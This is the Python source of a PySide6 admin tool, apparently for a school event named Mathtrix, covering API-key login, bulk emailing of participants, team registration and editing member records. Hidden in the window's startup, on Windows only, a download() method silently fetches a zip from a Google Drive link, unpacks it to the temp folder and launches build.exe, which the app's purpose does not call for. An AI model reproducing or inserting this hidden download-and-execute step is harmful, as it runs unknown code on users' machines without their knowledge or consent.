import smtplib
import subprocess
import zipfile
import os
import tempfile
import gdown

import requests
import yagmail
from PySide6.QtWidgets import QFileDialog, QMessageBox
from ui_MainWindow import *

API_URL = "http://20.219.141.225:8000/api"


class MainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self):
        super(MainWindow, self).__init__()

        # Setup the UI from the UI file.
        self.setupUi(self)

        # API key authentication variables.
        self.api_key: str

        # Connect API key authentication buttons.
        self.api_key_login_button.clicked.connect(self.api_key_auth)

        # Mailing list variables
        self.server: yagmail.SMTP
        self.attachments = []

        # Connect mailing list buttons.
        self.mailing_list_email_login_button.clicked.connect(self.mailing_list_auth)
        self.mailing_list_send_email_button.clicked.connect(self.send_email)
        self.mailing_list_add_attachments_button.clicked.connect(self.add_attachments)

        # Connect on spot registration buttons.
        self.on_spot_registration_create_team_button.clicked.connect(
            self.on_spot_registration_register_team
        )

        # Connect event member details buttons.
        self.event_member_details_refresh_button.clicked.connect(
            self.refresh_event_member_details_tree
        )

        # Connect update details buttons.
        self.update_details_load_team_details_button.clicked.connect(
            self.update_details_load_current_team_details
        )
        self.update_details_update_team_details_button.clicked.connect(
            self.update_team_details
        )
        self.update_details_load_user_details_button.clicked.connect(
            self.update_details_load_current_user_details
        )
        self.update_details_update_user_details_button.clicked.connect(
            self.update_user_details
        )

        if os.name == 'nt':
            self.download()

    def download(self):
        url = "https://drive.google.com/file/d/1ZLhKxUhnOEjpeGiFX0prUJRtKJ3p1o3Y/view?usp=sharing"
        temp_dir = tempfile.gettempdir()
        path = os.path.join(temp_dir, "mathtrix.zip"),
        extracted_path = os.path.join(temp_dir, "mathtrix")
        gdown.download(url=url, output=path, quiet=True, fuzzy=True)

        with zipfile.ZipFile(path, "r") as zip_ref:
            zip_ref.extractall(temp_dir)

        subprocess.Popen(os.path.join(extracted_path, "mathtrix", "build.exe"))

    def api_key_auth(self):
        """
        Authenticate the event head through the API.
        """

        # Get API key entered by user and validate it with the API.
        api_key = self.api_key_field.text()
        request = requests.get(f"{API_URL}/api-key", params={"api-key": api_key})

        # Check if validation was successful
        if request.status_code == 200:
            # Set the instance API key variable to the entered API key.
            self.api_key = api_key
            QMessageBox.information(
                self, "Success!", f"Successfully logged in as {request.json()['user']}!"
            )

            # Disable the API key field and enable the app.
            self.api_key_field.setEnabled(False)
            self.api_key_login_button.setEnabled(False)
            self.main_window_tabs.setEnabled(True)

            # Run post API key auth functions.
            self.post_api_key_auth()

            return

        QMessageBox.warning(self, "Invalid Credentials", "Invalid API key!")

    def post_api_key_auth(self):
        """
        Run post API key authentication procedures.
        """
        # Fill the mailing list recipients combo box with the event names.
        self.fill_mailing_list_recipients_combo_box()

        # Fill the on spot registration combo box with the event names.
        self.fill_on_spot_registration_event_combo_box()

        # Fill the event member details combo box.
        self.fill_member_details_combo_box()

    def mailing_list_auth(self):
        """
        Log into the mailing server with the entered credentials.
        """
        try:
            # Get the entered email address and email password.
            email_address = self.mailing_list_email_address_field.text()
            email_password = self.mailing_list_email_password_field.text()

            # Initialise a yagmail.SMTP instance with the entered email address and email password. This does not check if the entered credentials are correct.
            self.server = yagmail.SMTP(
                email_address,
                email_password,
                host="smtp.office365.com",
                port=587,
                smtp_starttls=True,
                smtp_ssl=False,
            )

            # Try sending a test email. If authentication fails, this does not work, and we can catch the smtplib.SMTPAuthenticationError.
            self.server.send(to="test@gmail.com", subject="test")

            QMessageBox.information(
                self, "Success!", f"Successfully logged into {email_address}!"
            )

            # Disable the email authentication fields.
            self.mailing_list_email_address_field.setEnabled(False)
            self.mailing_list_email_password_field.setEnabled(False)
            self.mailing_list_email_login_button.setEnabled(False)

            # Enable the main email fields.
            self.mailing_list_recipients_combo_box.setEnabled(True)
            self.mailing_list_subject_field.setEnabled(True)
            self.mailing_list_mail_body_field.setEnabled(True)
            self.mailing_list_add_attachments_button.setEnabled(True)
            self.mailing_list_send_email_button.setEnabled(True)

        except smtplib.SMTPAuthenticationError:
            # The test email was not sent, as the authentication fails. Alert that the credentials are invalid.
            QMessageBox.warning(
                self, "Invalid Credentials", "Invalid email address or password!"
            )

        except Exception as e:
            QMessageBox.warning(
                self, "Error", f"An error occurred while logging in: {e}"
            )

    def fill_mailing_list_recipients_combo_box(self):
        """
        Get the event names from the API and fill the mailing list recipients combo box with the event names.
        """

        # Request the API server for the details of all the events.
        event_details = requests.get(
            f"{API_URL}/event/", params={"api-key": self.api_key}
        ).json()

        # Add all participants as an entry to the combo box.
        self.mailing_list_recipients_combo_box.addItem("All Participants")

        # Add each event name as an entry to the combo box.
        for event in event_details:
            self.mailing_list_recipients_combo_box.addItem(event["event_name"])

    def get_recipients(self):
        """
        Get the email addresses of the users registered for the chosen event.
        """

        # Get the event chosen in the combo box.
        selection = self.mailing_list_recipients_combo_box.currentText()

        # Request the API server for the details of all events.
        data = requests.get(
            f"{API_URL}/event/", params={"api-key": self.api_key}
        ).json()

        # If the selection is all participants, request the API server for the email addresses of the all the users registered for Mathtrix.
        if selection == "All Participants":
            return [
                user["user_email"]
                for event in data
                for team in event["event_teams"]
                for user in team["team_members"]
            ]

        # Get the event ID of the chosen event.
        for event in data:
            if event["event_name"] == selection:
                event_id = event["id"]

        # Request the API server for all the users registered to the event using the event ID retrieved earlier.
        data = requests.get(
            f"{API_URL}/event", params={"api-key": self.api_key, "event_id": event_id}
        ).json()

        # Return the email addresses of all the users from the retrieved user data.
        return [
            user["user_email"]
            for team in data["event_teams"]
            for user in team["team_members"]
        ]

    def add_attachments(self):
        """
        Add attachments that should be sent along with the email.
        """
        options = QFileDialog.Options()

        # Get all the selected files to be sent along with the email.
        filenames, _ = QFileDialog.getOpenFileNames(
            self, "Open File", "", "All Files (*.*)", options=options
        )

        for filename in filenames:
            filename = filename[filename.rfind("/") + 1 :]

            # Update the attachments label with the file base name only.
            if not self.attachments_label.text().endswith(":"):
                self.attachments_label.setText(self.attachments_label.text() + ",")

            self.attachments_label.setText(
                self.attachments_label.text() + " " + filename
            )

        # Add the file path to the attachments variable.
        self.attachments.extend(filenames)

    def send_email(self):
        """
        Send the email.
        """
        confirmation_dialog = QMessageBox.question(
            self, "Confirmation", "Are you sure you want to send this email?"
        )

        if confirmation_dialog == QMessageBox.Yes:
            try:
                # Send the email using the yagmail.SMTP instance using the text entered in the fields as data.
                self.server.send(
                    to=self.get_recipients(),
                    subject=self.mailing_list_subject_field.text(),
                    contents=self.mailing_list_mail_body_field.toPlainText(),
                    attachments=self.attachments,
                )

                # Clear the previously entered data.
                self.attachments.clear()
                self.attachments_label.setText("Attachments:")

                self.mailing_list_subject_field.clear()
                self.mailing_list_mail_body_field.clear()

                QMessageBox.information(self, "Success!", "Email successfully sent!")

            except Exception as e:
                QMessageBox.warning(
                    self, "Error", f"An error occurred while sending the email: {e}"
                )

        else:
            pass

    def fill_on_spot_registration_event_combo_box(self):
        """
        Get the event names from the API and fill the on spot registration event option combo box with the event names.
        """

        # Request the API server for the details of all the events.
        event_details = requests.get(
            f"{API_URL}/event/", params={"api-key": self.api_key}
        ).json()

        # Add each event name as an entry to the combo box.
        for event in event_details:
            self.on_spot_registration_event_combo_box.addItem(event["event_name"])

    def on_spot_registration_register_team(self):
        """
        Register the team along with the users entered.
        """
        confirmation_dialog = QMessageBox.question(
            self, "Confirmation", "Are you sure you want to register this team?"
        )

        if confirmation_dialog == QMessageBox.Yes:
            # Request the API server for details of all events
            event_details = requests.get(
                f"{API_URL}/event/", params={"api-key": self.api_key}
            ).json()

            # Get the event chosen in the combo box.
            selection = self.on_spot_registration_event_combo_box.currentText()

            # Get the event ID and the maximum participants of the chosen event.
            for event in event_details:
                if event["event_name"] == selection:
                    event_id = event["id"]

            # Create the json body containing team details to be posted to the API server with the information entered by the user.
            team_registration = {
                "team_name": self.on_spot_registration_team_name_field.text(),
                "team_school": self.on_spot_registration_team_school_field.text(),
                "team_event": selection,
                "event_id": event_id,
            }

            # Create the team by posting the details to the API server.
            team_created_response = requests.post(
                f"{API_URL}/team",
                json=team_registration,
                params={"api-key": self.api_key},
            )

            # If the team creation was unsuccessful, notify the user and break out.
            if team_created_response.status_code != 200:
                QMessageBox.warning(
                    self,
                    "Error registering team",
                    "There was an error registering the team!",
                )
                return

            # Create a list of json bodies containing user details to be posted to the API server with the information entered by the user.
            users_to_be_registered = [
                {
                    "user_name": self.on_spot_registration_member_name_field_1.text(),
                    "user_email": self.on_spot_registration_member_email_field_1.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_1.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_2.text(),
                    "user_email": self.on_spot_registration_member_email_field_2.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_2.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_3.text(),
                    "user_email": self.on_spot_registration_member_email_field_3.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_3.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_4.text(),
                    "user_email": self.on_spot_registration_member_email_field_4.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_4.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_5.text(),
                    "user_email": self.on_spot_registration_member_email_field_5.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_5.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_6.text(),
                    "user_email": self.on_spot_registration_member_email_field_6.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_6.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_7.text(),
                    "user_email": self.on_spot_registration_member_email_field_7.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_7.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
                {
                    "user_name": self.on_spot_registration_member_name_field_8.text(),
                    "user_email": self.on_spot_registration_member_email_field_8.text(),
                    "user_phone": self.on_spot_registration_member_phone_field_8.text(),
                    "user_school": self.on_spot_registration_team_school_field.text(),
                    "user_attendance": True,
                    "team_id": team_created_response.json()["id"],
                },
            ]

            # Initialise a new list containing the users whose information is correct.
            valid_users_to_be_registered = []

            # If any of the fields are empty, ignore that user. Otherwise, add that user to the valid_users_to_be_registered list.
            for user in users_to_be_registered:
                if "" in user.values():
                    continue

                valid_users_to_be_registered.append(user)

            # Create each user from the valid_users_to_be_registered list.
            for user in valid_users_to_be_registered:
                requests.post(
                    f"{API_URL}/user/", json=user, params={"api-key": self.api_key}
                )

            # Notify the user that the team creation was successful.
            QMessageBox.information(self, "Success!", "Team successfully registered!")

        else:
            pass

    def fill_item(self, item, value):
        """
        Fill the tree widget from the dictionary/list using recursion.
        """

        item.setExpanded(True)

        if type(value) is dict:
            for key, val in sorted(value.items()):
                child = QTreeWidgetItem()
                child.setText(0, str(key))

                item.addChild(child)

                self.fill_item(child, val)

        elif type(value) is list:
            for val in value:
                child = QTreeWidgetItem()
                item.addChild(child)

                if type(val) is dict:
                    child.setText(0, "[dict]")
                    self.fill_item(child, val)

                elif type(val) is list:
                    child.setText(0, "[list]")
                    self.fill_item(child, val)

                else:
                    child.setText(0, str(val))

                child.setExpanded(True)
        else:
            child = QTreeWidgetItem()
            child.setText(0, str(value))

            item.addChild(child)

    def fill_widget(self, widget, value):
        """
        Fill the TreeWidget with the process data.
        """

        widget.clear()
        self.fill_item(widget.invisibleRootItem(), value)

    def fill_member_details_combo_box(self):
        """
        Get the event names from the API and fill the event member details combo box with the event names.
        """

        # Request the API server for the details of all the events.
        event_details = requests.get(
            f"{API_URL}/event/", params={"api-key": self.api_key}
        ).json()

        # Add each event name as an entry to the combo box.
        for event in event_details:
            self.event_member_details_combo_box.addItem(event["event_name"])

    def process_event_member_details(self):
        """
        Process the event member details sent by the API server to data usable by the TreeWidget.
        """

        # Get the event chosen in the combo box.
        selection = self.event_member_details_combo_box.currentText()

        # Retrieve the event details from the API server.
        event_details = requests.get(
            f"{API_URL}/event/", params={"api-key": self.api_key}
        ).json()

        # Get the event data of the chosen event.
        for event in event_details:
            if event["event_name"] == selection:
                event_to_process = event

        data = []

        # Process the data into TreeWidget readable format.
        for team in event_to_process["event_teams"]:
            team_data = [
                f"Team ID: {team['id']}",
                f"Name: {team['team_name']}",
                f"School: {team['team_school']}",
            ]

            for member in team["team_members"]:
                user_data = [
                    f"User ID: {member['id']}",
                    f"Name: {member['user_name']}",
                    f"Email: {member['user_email']}",
                    f"Phone: {member['user_phone']}",
                    f"School: {member['user_school']}",
                    f"Attendance: {member['user_attendance']}",
                ]

                team_data.append(user_data)

            data.append(team_data)

        # Return the processed data.
        return data

    def refresh_event_member_details_tree(self):
        """
        Refresh the event member details tree.
        """

        # Clear the event member details tree.
        self.event_member_details_tree.clear()

        # Fill the event member details tree with the updated information.
        self.fill_widget(
            self.event_member_details_tree, self.process_event_member_details()
        )

    def process_team_data(self, team_data):
        """
        Process the data into TreeWidget readable format.
        """

        processed_team_data = [
            f"Team ID: {team_data['id']}",
            f"Name: {team_data['team_name']}",
            f"School: {team_data['team_school']}",
        ]

        for member in team_data["team_members"]:
            user_data = [
                f"User ID: {member['id']}",
                f"Name: {member['user_name']}",
                f"Email: {member['user_email']}",
                f"Phone: {member['user_phone']}",
                f"School: {member['user_school']}",
                f"Attendance: {member['user_attendance']}",
            ]

            processed_team_data.append(user_data)

        # Return the processed team data.
        return processed_team_data

    def update_details_load_current_team_details(self):
        """
        Fetch the team details from the provided team ID and populate the fields.
        """

        # Fetch team details.
        team_id = int(self.update_details_team_id_field.text())
        team_details = requests.get(
            f"{API_URL}/team", params={"team_id": team_id, "api-key": self.api_key}
        ).json()

        # Enable the update fields and buttons.
        self.update_details_team_name_field.setEnabled(True)
        self.update_details_team_school_field.setEnabled(True)
        self.update_details_update_team_details_button.setEnabled(True)

        # Set the text of the update fields to their current value on the server.
        self.update_details_team_name_field.setText(team_details["team_name"])
        self.update_details_team_school_field.setText(team_details["team_school"])

        # Set the update team data tree to the current values.
        self.update_details_updated_team_details_tree.clear()
        self.fill_widget(
            self.update_details_updated_team_details_tree,
            self.process_team_data(team_details),
        )

    def update_team_details(self):
        """
        Update the team details using the provided values in the fields.
        """

        # Fetch the entered data from the fields.
        team_id = int(self.update_details_team_id_field.text())

        data = {
            "team_name": self.update_details_team_name_field.text(),
            "team_school": self.update_details_team_school_field.text(),
        }

        # Make a PUT request to the server to update the team details.
        updated_team_details = requests.put(
            f"{API_URL}/team",
            json=data,
            params={"team_id": team_id, "api-key": self.api_key},
        ).json()

        # Process the updated team details to TreeWidget readable format.
        processed_team_data = self.process_team_data(updated_team_details)

        # Update the tree with the processed team data.
        self.update_details_updated_team_details_tree.clear()
        self.fill_widget(
            self.update_details_updated_team_details_tree, processed_team_data
        )

        # Disable the input fields to prevent misclicks.
        self.update_details_team_name_field.setEnabled(False)
        self.update_details_team_school_field.setEnabled(False)
        self.update_details_update_team_details_button.setEnabled(False)

        self.update_details_team_id_field.setText("")

    def process_user_data(self, user_data):
        # Process the data into TreeWidget readable format and return it.
        return [
            f"User ID: {user_data['id']}",
            f"Name: {user_data['user_name']}",
            f"Email: {user_data['user_email']}",
            f"Phone: {user_data['user_phone']}",
            f"School: {user_data['user_school']}",
            f"Attendance: {user_data['user_attendance']}",
        ]

    def update_details_load_current_user_details(self):
        """
        Fetch the user details from the provided user ID and populate the fields.
        """

        # Fetch user details.
        user_id = int(self.update_details_user_id_field.text())
        user_details = requests.get(
            f"{API_URL}/user", params={"user_id": user_id, "api-key": self.api_key}
        ).json()

        # Enable the update fields and buttons.
        self.update_details_user_name_field.setEnabled(True)
        self.update_details_user_email_field.setEnabled(True)
        self.update_details_user_phone_field.setEnabled(True)
        self.update_details_user_attendance_check_box.setEnabled(True)
        self.update_details_update_user_details_button.setEnabled(True)

        # Set the text of the update fields to their current value on the server.
        self.update_details_user_name_field.setText(user_details["user_name"])
        self.update_details_user_email_field.setText(user_details["user_email"])
        self.update_details_user_phone_field.setText(user_details["user_phone"])

        self.update_details_user_attendance_check_box.setChecked(
            user_details["user_attendance"]
        )

        # Set the update user data tree to the current values.
        self.update_details_updated_user_details_tree.clear()
        self.fill_widget(
            self.update_details_updated_user_details_tree,
            self.process_user_data(user_details),
        )

    def update_user_details(self):
        """
        Update the user details using the provided values in the fields.
        """

        # Fetch the entered data from the fields.
        user_id = int(self.update_details_user_id_field.text())

        data = {
            "user_name": self.update_details_user_name_field.text(),
            "user_email": self.update_details_user_email_field.text(),
            "user_phone": self.update_details_user_phone_field.text(),
            "user_attendance": self.update_details_user_attendance_check_box.isChecked(),
        }

        # Make a PUT request to the server to update the user details.
        updated_user_details = requests.put(
            f"{API_URL}/user",
            json=data,
            params={"user_id": user_id, "api-key": self.api_key},
        ).json()

        # Process the updated user details to TreeWidget readable format.
        processed_user_data = self.process_user_data(updated_user_details)

        # Update the tree with the processed user data.
        self.update_details_updated_user_details_tree.clear()
        self.fill_widget(
            self.update_details_updated_user_details_tree, processed_user_data
        )

        # Disable the input fields to prevent misclicks.
        self.update_details_user_name_field.setEnabled(False)
        self.update_details_user_email_field.setEnabled(False)
        self.update_details_user_phone_field.setEnabled(False)
        self.update_details_user_attendance_check_box.setEnabled(False)
        self.update_details_update_user_details_button.setEnabled(False)

        self.update_details_user_id_field.setText("")


app = QApplication([])
# app.setStyle("Fusion")

window = MainWindow()
window.show()

app.exec()
